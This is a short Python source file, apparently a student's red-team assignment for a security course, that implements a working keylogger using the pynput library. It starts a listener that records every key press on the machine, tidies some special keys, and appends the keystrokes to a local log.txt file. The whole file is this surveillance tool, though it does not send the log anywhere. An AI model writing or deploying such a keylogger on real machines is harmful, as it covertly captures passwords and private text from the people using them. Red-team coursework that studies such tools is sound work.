"""
Grace Lombardi
CSEC 473
Red Team Tool
4/10/2021
"""
from pynput.keyboard import Listener


def log_keystroke(key):
    # Replaces all single quotes with nothing
    key = str(key).replace("'", "")
    # Replaces space key presses as a string of a space for log
    if key == 'Key.space':
        key = ' '
    # Replaces shift right key presses as an empty string
    if key == 'Key.shift_r':
        key = ''
    # Replaces enter key presses as a string of a new line character for log
    if key == "Key.enter":
        key = '\n'
    # Open log.txt and write each key press to it
    with open("log.txt", 'a') as f:
        f.write(key)


def main():
    # This starts a listener on the client that waits for key presses
    with Listener(on_press=log_keystroke) as l:
        l.join()


main()
